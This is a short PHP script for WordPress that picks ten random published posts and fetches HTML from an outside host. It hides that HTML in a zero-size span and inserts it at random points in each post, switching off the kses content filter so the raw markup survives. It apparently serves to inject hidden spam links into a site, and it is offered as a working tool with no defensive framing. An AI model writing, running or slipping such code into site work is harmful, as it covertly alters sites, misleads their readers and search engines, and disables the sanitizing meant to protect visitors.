<?php
require $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';
function insert_remote_content_to_posts($n) {
    $args = array(
        'post_type' => 'post',
        'post_status' => 'publish',
        'orderby' => 'rand',
        'posts_per_page' => $n, 
    );

    $query = new WP_Query($args);

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $content = get_the_content();

            $link_position = rand(0, strlen($content));
            $remote_content = get_remote_content();

            $content = substr_replace($content, $remote_content, $link_position, 0);
            remove_filter('content_save_pre', 'wp_filter_post_kses');
            remove_filter('content_filtered_save_pre', 'wp_filter_post_kses');
            $post_data = array(
                'ID' => get_the_ID(),
                'post_content' => $content,
            );
            
            wp_update_post($post_data);
            
            echo 'Updated post link: ' . get_permalink(get_the_ID()) . '<br>';

            add_filter('content_save_pre', 'wp_filter_post_kses');
            add_filter('content_filtered_save_pre', 'wp_filter_post_kses');
        }
        wp_reset_postdata();
    }
}
function get_remote_content() {
    $remote_url = 'https://wailian.wapvv.com/';
    $request = new WP_Http();
    $response = $request->request($remote_url);

    if (!is_wp_error($response) && $response['response']['code'] == 200) {
        $content = '<span style="font-size:0px; color:#ff0000;">' . $response['body'] . '</span>';
        
        return $content;
    }

    return ''; 
}

insert_remote_content_to_posts(10);
?>